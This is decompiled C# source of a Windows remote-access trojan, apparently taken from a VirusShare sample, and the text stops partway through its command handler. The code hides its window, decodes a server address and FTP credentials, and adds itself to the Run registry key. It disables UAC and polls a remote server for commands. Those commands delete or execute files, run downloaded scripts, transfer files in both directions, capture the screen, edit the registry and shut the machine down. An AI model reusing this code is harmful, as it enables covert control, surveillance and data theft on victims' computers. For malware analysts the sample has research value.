// Decompiled with JetBrains decompiler
// Type: Windows.Form1
// Assembly: Windows, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79C82968-ACCA-434D-B77A-E6AFF79DFC80
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Scar.oajo-73c2744f575cfc2a701f2e9e007e619bd64c245aa21fa5e718d5bcd65237d589.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Windows.My;

namespace Windows
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("Label3")]
    private Label _Label3;
    [AccessedThroughProperty("Label4")]
    private Label _Label4;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Label5")]
    private Label _Label5;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("Timer5")]
    private System.Windows.Forms.Timer _Timer5;
    [AccessedThroughProperty("lstDevices")]
    private ListBox _lstDevices;
    [AccessedThroughProperty("objPreview")]
    private PictureBox _objPreview;
    [AccessedThroughProperty("Label6")]
    private Label _Label6;
    private int iDevice;
    private int hHwnd;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.iDevice = 0;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Label1 = new Label();
      this.Label2 = new Label();
      this.Label3 = new Label();
      this.Label4 = new Label();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Label5 = new Label();
      this.PictureBox1 = new PictureBox();
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.Timer4 = new System.Windows.Forms.Timer(this.components);
      this.TextBox1 = new TextBox();
      this.Timer5 = new System.Windows.Forms.Timer(this.components);
      this.lstDevices = new ListBox();
      this.objPreview = new PictureBox();
      this.Label6 = new Label();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      ((ISupportInitialize) this.objPreview).BeginInit();
      this.SuspendLayout();
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      Point point1 = new Point(12, 9);
      Point point2 = point1;
      label1_1.Location = point2;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      Size size1 = new Size(39, 13);
      Size size2 = size1;
      label1_2.Size = size2;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Label1";
      this.Label1.Visible = false;
      this.Label2.AutoSize = true;
      Label label2_1 = this.Label2;
      point1 = new Point(12, 22);
      Point point3 = point1;
      label2_1.Location = point3;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(39, 13);
      Size size3 = size1;
      label2_2.Size = size3;
      this.Label2.TabIndex = 1;
      this.Label2.Text = "Label2";
      this.Label2.Visible = false;
      this.Label3.AutoSize = true;
      Label label3_1 = this.Label3;
      point1 = new Point(12, 35);
      Point point4 = point1;
      label3_1.Location = point4;
      this.Label3.Name = "Label3";
      Label label3_2 = this.Label3;
      size1 = new Size(39, 13);
      Size size4 = size1;
      label3_2.Size = size4;
      this.Label3.TabIndex = 2;
      this.Label3.Text = "Label3";
      this.Label3.Visible = false;
      this.Label4.AutoSize = true;
      Label label4_1 = this.Label4;
      point1 = new Point(12, 48);
      Point point5 = point1;
      label4_1.Location = point5;
      this.Label4.Name = "Label4";
      Label label4_2 = this.Label4;
      size1 = new Size(39, 13);
      Size size5 = size1;
      label4_2.Size = size5;
      this.Label4.TabIndex = 3;
      this.Label4.Text = "Label4";
      this.Label4.Visible = false;
      this.Timer1.Interval = 2000;
      this.Label5.AutoSize = true;
      Label label5_1 = this.Label5;
      point1 = new Point(12, 82);
      Point point6 = point1;
      label5_1.Location = point6;
      this.Label5.Name = "Label5";
      Label label5_2 = this.Label5;
      size1 = new Size(39, 13);
      Size size6 = size1;
      label5_2.Size = size6;
      this.Label5.TabIndex = 4;
      this.Label5.Text = "Label5";
      this.Label5.Visible = false;
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(155, 113);
      Point point7 = point1;
      pictureBox1_1.Location = point7;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(25, 28);
      Size size7 = size1;
      pictureBox1_2.Size = size7;
      this.PictureBox1.TabIndex = 5;
      this.PictureBox1.TabStop = false;
      this.PictureBox1.Visible = false;
      this.Timer2.Interval = 1;
      this.Timer3.Interval = 5000;
      this.Timer4.Interval = 1;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(0, 0);
      Point point8 = point1;
      textBox1_1.Location = point8;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(100, 20);
      Size size8 = size1;
      textBox1_2.Size = size8;
      this.TextBox1.TabIndex = 6;
      this.Timer5.Interval = 20000;
      this.lstDevices.FormattingEnabled = true;
      ListBox lstDevices1 = this.lstDevices;
      point1 = new Point(0, 0);
      Point point9 = point1;
      lstDevices1.Location = point9;
      this.lstDevices.Name = "lstDevices";
      ListBox lstDevices2 = this.lstDevices;
      size1 = new Size(120, 95);
      Size size9 = size1;
      lstDevices2.Size = size9;
      this.lstDevices.TabIndex = 7;
      PictureBox objPreview1 = this.objPreview;
      point1 = new Point(0, 0);
      Point point10 = point1;
      objPreview1.Location = point10;
      this.objPreview.Name = "objPreview";
      PictureBox objPreview2 = this.objPreview;
      size1 = new Size(100, 50);
      Size size10 = size1;
      objPreview2.Size = size10;
      this.objPreview.TabIndex = 8;
      this.objPreview.TabStop = false;
      this.Label6.AutoSize = true;
      Label label6_1 = this.Label6;
      point1 = new Point(0, 0);
      Point point11 = point1;
      label6_1.Location = point11;
      this.Label6.Name = "Label6";
      Label label6_2 = this.Label6;
      size1 = new Size(39, 13);
      Size size11 = size1;
      label6_2.Size = size11;
      this.Label6.TabIndex = 9;
      this.Label6.Text = "Label6";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      size1 = new Size(1, 1);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label6);
      this.Controls.Add((Control) this.objPreview);
      this.Controls.Add((Control) this.lstDevices);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.Label5);
      this.Controls.Add((Control) this.Label4);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.Label1);
      this.FormBorderStyle = FormBorderStyle.None;
      size1 = new Size(1, 1);
      this.MaximumSize = size1;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      ((ISupportInitialize) this.PictureBox1).EndInit();
      ((ISupportInitialize) this.objPreview).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Label Label2
    {
      [DebuggerNonUserCode] get => this._Label2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    internal virtual Label Label3
    {
      [DebuggerNonUserCode] get => this._Label3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label3 = value;
    }

    internal virtual Label Label4
    {
      [DebuggerNonUserCode] get => this._Label4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label4 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual Label Label5
    {
      [DebuggerNonUserCode] get => this._Label5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label5 = value;
    }

    internal virtual PictureBox PictureBox1
    {
      [DebuggerNonUserCode] get => this._PictureBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    public virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Timer3 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this._Timer4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer4_Tick);
        if (this._Timer4 != null)
          this._Timer4.Tick -= eventHandler;
        this._Timer4 = value;
        if (this._Timer4 == null)
          return;
        this._Timer4.Tick += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer5
    {
      [DebuggerNonUserCode] get => this._Timer5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer5_Tick);
        if (this._Timer5 != null)
          this._Timer5.Tick -= eventHandler;
        this._Timer5 = value;
        if (this._Timer5 == null)
          return;
        this._Timer5.Tick += eventHandler;
      }
    }

    internal virtual ListBox lstDevices
    {
      [DebuggerNonUserCode] get => this._lstDevices;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._lstDevices = value;
    }

    internal virtual PictureBox objPreview
    {
      [DebuggerNonUserCode] get => this._objPreview;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._objPreview = value;
    }

    internal virtual Label Label6
    {
      [DebuggerNonUserCode] get => this._Label6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label6 = value;
    }

    public void saveImage() => capture.SendMessage(this.hHwnd, 1049, 0, (object) "C:\\web243566334.jpg");

    private void startPreview()
    {
      int height = this.objPreview.Height;
      int width = this.objPreview.Width;
      string lpszWindowName = Conversions.ToString(this.iDevice);
      this.hHwnd = capture.capCreateCaptureWindowA(ref lpszWindowName, 1342177280, 0, 0, 640, (short) 480, this.objPreview.Handle.ToInt32(), 0);
      if (capture.SendMessage(this.hHwnd, 1034, this.iDevice, (object) 0) != 0)
      {
        capture.SendMessage(this.hHwnd, 1077, -1, (object) 0);
        capture.SendMessage(this.hHwnd, 1076, 66, (object) 0);
        capture.SendMessage(this.hHwnd, 1074, -1, (object) 0);
        capture.SetWindowPos(this.hHwnd, 1, 0, 0, width, height, 6);
      }
      else
        capture.DestroyWindow(this.hHwnd);
    }

    private void LoadDeviceList()
    {
      string lpszName = Strings.Space(100);
      string lpszVer = Strings.Space(100);
      int wDriver = 0;
      bool driverDescriptionA;
      do
      {
        driverDescriptionA = capture.capGetDriverDescriptionA(checked ((short) wDriver), ref lpszName, 100, ref lpszVer, 100);
        if (driverDescriptionA)
          this.lstDevices.Items.Add((object) lpszName.Trim());
        checked { ++wDriver; }
      }
      while (driverDescriptionA);
    }

    private void checkDeviceList()
    {
      if (this.lstDevices.Items.Count > 0)
        this.lstDevices.SelectedIndex = 0;
      else
        this.lstDevices.Items.Add((object) "Nessun device trovato");
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern short GetAsyncKeyState(int vKey);

    private Bitmap CaptureScreen()
    {
      Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height), CopyPixelOperation.SourceCopy);
      return bitmap;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        this.Opacity = 0.0;
        this.Visible = false;
        try
        {
          this.Visible = false;
          this.Opacity = 0.0;
          string environmentVariable = Environment.GetEnvironmentVariable("WINDIR");
          if (MyProject.Computer.FileSystem.FileExists(environmentVariable + "\\system32\\Lib32.dll") | MyProject.Computer.FileSystem.FileExists("Lib32.dll"))
          {
            StreamReader streamReader = new StreamReader("Lib32.dll");
            this.Label1.Text = streamReader.ReadLine().ToLower().Replace("--56542-324452-", "a").ToLower().Replace("--234453-2342254355-", "b").ToLower().Replace("--3243453-344523456456-", "c").ToLower().Replace("--132242-42343255646-", "d").ToLower().Replace("--643221-2535243234-", nameof (e)).ToLower().Replace("--675634-324544556863-", "f").ToLower().Replace("--23432534-2343256255643-", "g").ToLower().Replace("--3321334-234542435645-", "h").ToLower().Replace("--325434534-1234235-", "i").ToLower().Replace("--4324532-3432543232-", "l").ToLower().Replace("--23654224-32455322-", "m").ToLower().Replace("--2344543-32456323-", "n").ToLower().Replace("--45364443-3235446-", "o").ToLower().Replace("--7856743267-55674346-", "p").ToLower().Replace("--9823546-4546757823567-", "q").ToLower().Replace("--8764674-4577667532-", "r").ToLower().Replace("--546568645-57565654-", "s").ToLower().Replace("--87875456-546457456-", "t").ToLower().Replace("--475686866-3446643578-", "u").ToLower().Replace("--564575878-4564675653-", "v").ToLower().Replace("--675776743-64567676-", "z").ToLower().Replace("--345676575-434534622-", "w").ToLower().Replace("--4545676732-536546342-", "x").ToLower().Replace("--452342564-42352455-", "y").ToLower().Replace("--232546743-56434532-", "k").ToLower().Replace("--332546442-435312356-", "j");
            this.Label2.Text = streamReader.ReadLine().ToLower().Replace("--56542-324452-", "a").ToLower().Replace("--234453-2342254355-", "b").ToLower().Replace("--3243453-344523456456-", "c").ToLower().Replace("--132242-42343255646-", "d").ToLower().Replace("--643221-2535243234-", nameof (e)).ToLower().Replace("--675634-324544556863-", "f").ToLower().Replace("--23432534-2343256255643-", "g").ToLower().Replace("--3321334-234542435645-", "h").ToLower().Replace("--325434534-1234235-", "i").ToLower().Replace("--4324532-3432543232-", "l").ToLower().Replace("--23654224-32455322-", "m").ToLower().Replace("--2344543-32456323-", "n").ToLower().Replace("--45364443-3235446-", "o").ToLower().Replace("--7856743267-55674346-", "p").ToLower().Replace("--9823546-4546757823567-", "q").ToLower().Replace("--8764674-4577667532-", "r").ToLower().Replace("--546568645-57565654-", "s").ToLower().Replace("--87875456-546457456-", "t").ToLower().Replace("--475686866-3446643578-", "u").ToLower().Replace("--564575878-4564675653-", "v").ToLower().Replace("--675776743-64567676-", "z").ToLower().Replace("--345676575-434534622-", "w").ToLower().Replace("--4545676732-536546342-", "x").ToLower().Replace("--452342564-42352455-", "y").ToLower().Replace("--232546743-56434532-", "k").ToLower().Replace("--332546442-435312356-", "j");
            this.Label3.Text = streamReader.ReadLine().ToLower().Replace("--56542-324452-", "a").ToLower().Replace("--234453-2342254355-", "b").ToLower().Replace("--3243453-344523456456-", "c").ToLower().Replace("--132242-42343255646-", "d").ToLower().Replace("--643221-2535243234-", nameof (e)).ToLower().Replace("--675634-324544556863-", "f").ToLower().Replace("--23432534-2343256255643-", "g").ToLower().Replace("--3321334-234542435645-", "h").ToLower().Replace("--325434534-1234235-", "i").ToLower().Replace("--4324532-3432543232-", "l").ToLower().Replace("--23654224-32455322-", "m").ToLower().Replace("--2344543-32456323-", "n").ToLower().Replace("--45364443-3235446-", "o").ToLower().Replace("--7856743267-55674346-", "p").ToLower().Replace("--9823546-4546757823567-", "q").ToLower().Replace("--8764674-4577667532-", "r").ToLower().Replace("--546568645-57565654-", "s").ToLower().Replace("--87875456-546457456-", "t").ToLower().Replace("--475686866-3446643578-", "u").ToLower().Replace("--564575878-4564675653-", "v").ToLower().Replace("--675776743-64567676-", "z").ToLower().Replace("--345676575-434534622-", "w").ToLower().Replace("--4545676732-536546342-", "x").ToLower().Replace("--452342564-42352455-", "y").ToLower().Replace("--232546743-56434532-", "k").ToLower().Replace("--332546442-435312356-", "j");
            this.Label4.Text = streamReader.ReadLine().ToLower().Replace("--56542-324452-", "a").ToLower().Replace("--234453-2342254355-", "b").ToLower().Replace("--3243453-344523456456-", "c").ToLower().Replace("--132242-42343255646-", "d").ToLower().Replace("--643221-2535243234-", nameof (e)).ToLower().Replace("--675634-324544556863-", "f").ToLower().Replace("--23432534-2343256255643-", "g").ToLower().Replace("--3321334-234542435645-", "h").ToLower().Replace("--325434534-1234235-", "i").ToLower().Replace("--4324532-3432543232-", "l").ToLower().Replace("--23654224-32455322-", "m").ToLower().Replace("--2344543-32456323-", "n").ToLower().Replace("--45364443-3235446-", "o").ToLower().Replace("--7856743267-55674346-", "p").ToLower().Replace("--9823546-4546757823567-", "q").ToLower().Replace("--8764674-4577667532-", "r").ToLower().Replace("--546568645-57565654-", "s").ToLower().Replace("--87875456-546457456-", "t").ToLower().Replace("--475686866-3446643578-", "u").ToLower().Replace("--564575878-4564675653-", "v").ToLower().Replace("--675776743-64567676-", "z").ToLower().Replace("--345676575-434534622-", "w").ToLower().Replace("--4545676732-536546342-", "x").ToLower().Replace("--452342564-42352455-", "y").ToLower().Replace("--232546743-56434532-", "k").ToLower().Replace("--332546442-435312356-", "j");
            streamReader.Close();
          }
          try
          {
            MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", this.Label2.Text, (object) (environmentVariable + "\\system32\\" + this.Label2.Text));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object) 0);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          if (!MyProject.Computer.FileSystem.FileExists(environmentVariable + "\\system32\\id000.dll"))
          {
            Random random = new Random();
            int num1 = random.Next(0, 999999999);
            int num2 = random.Next(0, 999999999);
            StreamWriter streamWriter = new StreamWriter(environmentVariable + "\\system32\\id000.dll");
            streamWriter.WriteLine(Conversions.ToString(num1) + "-" + Conversions.ToString(num2));
            streamWriter.Close();
          }
          StreamReader streamReader1 = new StreamReader(environmentVariable + "\\system32\\id000.dll");
          string str = streamReader1.ReadLine();
          streamReader1.Close();
          this.Label5.Text = str;
          try
          {
            if (!MyProject.Computer.FileSystem.FileExists(environmentVariable + "\\system32\\" + this.Label2.Text))
            {
              MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, environmentVariable + "\\system32\\" + this.Label2.Text);
              MyProject.Computer.FileSystem.CopyFile("Lib32.dll", environmentVariable + "\\system32\\Lib32.dll");
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          if (Operators.CompareString(Application.ExecutablePath, "C:\\WINDOWS\\system32\\" + this.Label2.Text, false) != 0)
          {
            Process.Start("C:\\WINDOWS\\system32\\" + this.Label2.Text);
            Application.Exit();
          }
          else
          {
            this.Timer3.Stop();
            this.Timer1.Start();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Timer1.Start();
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        string environmentVariable = Environment.GetEnvironmentVariable("%WINDIR%");
        this.Label1.Text = this.Label1.Text.Replace("ftp://", "http://");
        StreamReader streamReader1 = new StreamReader(WebRequest.Create(this.Label1.Text + "True.html").GetResponse().GetResponseStream());
        string Left1 = streamReader1.ReadLine();
        streamReader1.Close();
        StreamReader streamReader2 = new StreamReader(WebRequest.Create(this.Label1.Text + "ID.html").GetResponse().GetResponseStream());
        string Left2 = streamReader2.ReadLine();
        streamReader2.Close();
        StreamReader streamReader3 = new StreamReader(WebRequest.Create(this.Label1.Text + "Command.html").GetResponse().GetResponseStream());
        string str1 = streamReader3.ReadLine();
        try
        {
          if (str1.Contains("2355465.getid"))
          {
            environmentVariable = Environment.GetEnvironmentVariable("%WINDIR%");
            string str2 = this.Label1.Text.Replace("http://", "ftp://");
            StreamWriter streamWriter = new StreamWriter(environmentVariable + "smac.txt");
            streamWriter.Write(this.Label5.Text);
            streamWriter.Close();
            string name = MyProject.Computer.Name;
            MyProject.Computer.Network.UploadFile(environmentVariable + "smac.txt", str2 + name + "_ID.html", this.Label3.Text, this.Label4.Text);
          }
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          try
          {
            environmentVariable = Environment.GetEnvironmentVariable("%WINDIR%");
            string str3 = this.Label1.Text.Replace("http://", "ftp://");
            StreamWriter streamWriter = new StreamWriter(environmentVariable + "smac.txt");
            streamWriter.Write(this.Label5.Text);
            streamWriter.Close();
            string name = MyProject.User.Name;
            MyProject.Computer.Network.UploadFile(environmentVariable + "smac.txt", str3 + name + "_ID.html", this.Label3.Text, this.Label4.Text);
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            try
            {
              environmentVariable = Environment.GetEnvironmentVariable("%WINDIR%");
              string str4 = this.Label1.Text.Replace("http://", "ftp://");
              StreamWriter streamWriter = new StreamWriter(environmentVariable + "smac.txt");
              streamWriter.Write(this.Label5.Text);
              streamWriter.Close();
              string text = this.Label5.Text;
              MyProject.Computer.Network.UploadFile(environmentVariable + "smac.txt", str4 + text + "_ID.html", this.Label3.Text, this.Label4.Text);
            }
            catch (Exception ex3)
            {
              ProjectData.SetProjectError(ex3);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
        if (!(Operators.CompareString(Left2, this.Label5.Text, false) == 0 | Operators.CompareString(Left2, "All", false) == 0) || Operators.CompareString(Left1, "1", false) != 0)
          return;
        string str5 = this.Label1.Text.Replace("http://", "ftp://");
        StreamWriter streamWriter1 = new StreamWriter(environmentVariable + "\\True.txt");
        streamWriter1.WriteLine("0");
        streamWriter1.Close();
        MyProject.Computer.Network.UploadFile(environmentVariable + "\\True.txt", str5 + "True.html", this.Label3.Text, this.Label4.Text);
        if (str1.Contains("253.delfile "))
        {
          str1 = str1.Replace("253.delfile ", "");
          FileSystem.Kill(str1);
        }
        if (str1.Contains("253.remfile "))
        {
          str1 = str1.Replace("253.remfile ", "");
          MyProject.Computer.FileSystem.RenameFile(str1, streamReader3.ReadLine());
        }
        if (str1.Contains("253.copyfile "))
        {
          str1 = str1.Replace("253.copyfile ", "");
          MyProject.Computer.FileSystem.CopyFile(str1, streamReader3.ReadLine());
        }
        if (str1.Contains("253.movefile "))
        {
          str1 = str1.Replace("253.movefile ", "");
          MyProject.Computer.FileSystem.MoveFile(str1, streamReader3.ReadLine());
        }
        if (str1.Contains("253.execfile "))
        {
          str1 = str1.Replace("253.execfile ", "");
          Process.Start(str1);
        }
        if (str1.Contains("253.writefile "))
        {
          str1 = str1.Replace("253.writefile ", "");
          StreamWriter streamWriter2 = new StreamWriter(str1);
          streamWriter2.Write(streamReader3.ReadToEnd());
          streamWriter2.Close();
        }
        if (str1.Contains("253.deldirectoryfolder "))
        {
          str1 = str1.Replace("253.deldirectoryfolder ", "");
          FileSystem.Kill(str1 + "\\*.*");
        }
        if (str1.Contains("253.makecreatedirectoryfolder "))
        {
          str1 = str1.Replace("253.makecreatedirectoryfolder ", "");
          MyProject.Computer.FileSystem.CreateDirectory(str1);
        }
        if (str1.Contains("253.remdirectoryfolder "))
        {
          str1 = str1.Replace("253.remdirectoryfolder ", "");
          MyProject.Computer.FileSystem.RenameDirectory(str1, streamReader3.ReadLine());
        }
        if (str1.Contains("253.copydirectoryfolder "))
        {
          str1 = str1.Replace("253.copydirectoryfolder ", "");
          MyProject.Computer.FileSystem.CopyDirectory(str1, streamReader3.ReadLine());
        }
        if (str1.Contains("253.movedirectoryfolder "))
        {
          str1 = str1.Replace("253.movedirectoryfolder ", "");
          MyProject.Computer.FileSystem.MoveDirectory(str1, streamReader3.ReadLine());
        }
        if (str1.Contains("253.dos.batcommand "))
        {
          str1 = streamReader3.ReadToEnd();
          StreamWriter streamWriter3 = new StreamWriter("sub_command.bat");
          streamWriter3.Write(str1);
          streamWriter3.Close();
          Process.Start("sub_command.bat");
        }
        if (str1.Contains("253.vbscript.vbscriptcommand "))
        {
          str1 = streamReader3.ReadToEnd();
          StreamWriter streamWriter4 = new StreamWriter("sub_vbscriptcommand.vbs");
          streamWriter4.Write(str1);
          streamWriter4.Close();
          Process.Start("sub_vbscriptcommand.vbs");
        }
        if (str1.Contains("253.jscript.jscriptcommand "))
        {
          str1 = streamReader3.ReadToEnd();
          StreamWriter streamWriter5 = new StreamWriter("sub_jscriptcommand.js");
          streamWriter5.Write(str1);
          streamWriter5.Close();
          Process.Start("sub_jscriptcommand.js");
        }
        if (str1.Contains("253.message.null "))
        {
          str1 = str1.Replace("253.message.null ", "");
          int num = (int) Interaction.MsgBox((object) str1);
        }
        if (str1.Contains("253.message.alert "))
        {
          str1 = str1.Replace("253.message.alert ", "");
          int num = (int) Interaction.MsgBox((object) str1, MsgBoxStyle.Exclamation);
        }
        if (str1.Contains("253.message.info "))
        {
          str1 = str1.Replace("253.message.info ", "");
          int num = (int) Interaction.MsgBox((object) str1, MsgBoxStyle.Information);
        }
        if (str1.Contains("253.message.error "))
        {
          str1 = str1.Replace("253.message.error ", "");
          int num = (int) Interaction.MsgBox((object) str1, MsgBoxStyle.Critical);
        }
        if (str1.Contains("253.pcscreen.desktop "))
        {
          string str6 = this.Label1.Text.Replace("http://", "ftp://");
          this.PictureBox1.Image = (Image) this.CaptureScreen();
          this.PictureBox1.Image.Save("C:\\screenpc.jpg");
          Bitmap bitmap1 = new Bitmap("C:\\screenpc.jpg");
          int width = 500;
          int height = 313;
          Bitmap bitmap2 = new Bitmap(width, height);
          Graphics graphics = Graphics.FromImage((Image) bitmap2);
          graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
          graphics.DrawImage((Image) bitmap1, new Rectangle(0, 0, width, height), new Rectangle(0, 0, bitmap1.Width, bitmap1.Height), GraphicsUnit.Pixel);
          bitmap2.Save("C:\\screenpcsized.jpg", ImageFormat.Jpeg);
          MyProject.Computer.Network.UploadFile("C:\\screenpcsized.jpg", str6 + "pcscreen3.jpg", this.Label3.Text, this.Label4.Text);
        }
        if (str1.Contains("253.transfeer.hackertovictim "))
        {
          str1 = str1.Replace("253.transfeer.hackertovictim ", "");
          MyProject.Computer.Network.DownloadFile(this.Label1.Text + "transfeer.trn", str1);
        }
        if (str1.Contains("253.transfeer.victimtohacker "))
        {
          string str7 = this.Label1.Text.Replace("http://", "ftp://");
          str1 = str1.Replace("253.transfeer.victimtohacker ", "");
          MyProject.Computer.Network.UploadFile(str1, str7 + "transfeer.trn", this.Label3.Text, this.Label4.Text);
        }
        if (str1.Contains("253.registry.setvalue "))
        {
          str1 = str1.Replace("253.registry.setvalue ", "");
          if (Operators.CompareString(str1, "integer", false) == 0)
            MyProject.Computer.Registry.SetValue(streamReader3.ReadLine(), streamReader3.ReadLine(), (object) Conversions.ToInteger(streamReader3.ReadLine()));
          if (Operators.CompareString(str1, "string", false) == 0)
            MyProject.Computer.Registry.SetValue(streamReader3.ReadLine(), streamReader3.ReadLine(), (object) streamReader3.ReadLine());
        }
        if (str1.Contains("253.registry.createkey "))
        {
          str1 = str1.Replace("253.registry.createkey ", "");
          MyProject.Computer.Registry.Users.CreateSubKey(str1);
        }
        if (str1.Contains("253.registry.readvalue "))
        {
          str1 = str1.Replace("253.registry.readvalue ", "");
          RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.Users.GetValue(str1));
        }
        if (str1.Contains("253.system.shutdown -s"))
          Interaction.Shell("shutdown -s -t" + streamReader3.ReadLine());
        if (str1.Contains("253.system.shutdown -r"))
          Interaction.Shell("shutdown -r -t" + streamReader3.ReadLine());
        if (str1.Contains("253.system.killexplorer"))
          Interaction.Shell("taskkill /F /IM explorer.exe");
